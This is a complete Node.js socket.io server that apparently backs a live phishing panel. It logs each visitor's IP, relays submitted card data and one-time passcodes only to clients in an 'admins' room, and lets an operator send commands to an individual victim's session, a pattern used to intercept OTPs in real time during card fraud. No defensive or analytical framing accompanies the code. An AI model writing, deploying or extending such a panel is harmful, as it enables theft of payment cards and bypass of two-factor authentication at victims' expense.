const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const port = process.env.PORT || 8080;
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

io.on('connection', (socket) => {
  console.log('A client connected:', socket.id);

  // Global broadcast for any new connection
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  io.emit('visitor_update', {
    id: socket.id,
    ip: clientIp,
    created_at: new Date().toISOString()
  });

  // Handler for an admin identifying themselves
  socket.on('admin_hello', () => {
    console.log(`Admin registered: ${socket.id}`);
    socket.join('admins');
  });

  // Handler for card data from a user
  socket.on('card_submission', (payload) => {
    const submissionPayload = {
      ...payload,
      id: socket.id, // Tag the submission with the user's unique socket ID
      user_ip: clientIp,
      created_at: new Date().toISOString()
    };
    // Send the data ONLY to admins
    io.to('admins').emit('card_submission', submissionPayload);
  });

  // Handler for commands from an admin
  socket.on('admin_command', (payload) => {
    if (payload.submission_id) {
      // Send the command ONLY to the specific user
      io.to(payload.submission_id).emit('admin_command', payload);
    }
  });

  // Handler for OTPs from a user
  socket.on('otp_submitted', (payload) => {
    const otpPayload = {
      ...payload,
      id: socket.id // Tag with user's socket ID
    };
    // Send the OTP ONLY to admins
    io.to('admins').emit('otp_submitted', otpPayload);
  });

  // Chat handlers remain global broadcasts
  socket.on('chat_message', (payload) => {
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    io.emit('start_chat', payload);
  });

  // Global broadcast for a client disconnecting
  socket.on('disconnect', () => {
    console.log('A client disconnected:', socket.id);
    io.emit('visitor_left', { id: socket.id });
  });
});

// Serve static files from the dist directory
app.use(express.static(path.join(__dirname, 'dist')));

// For any route, serve index.html (for React Router support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
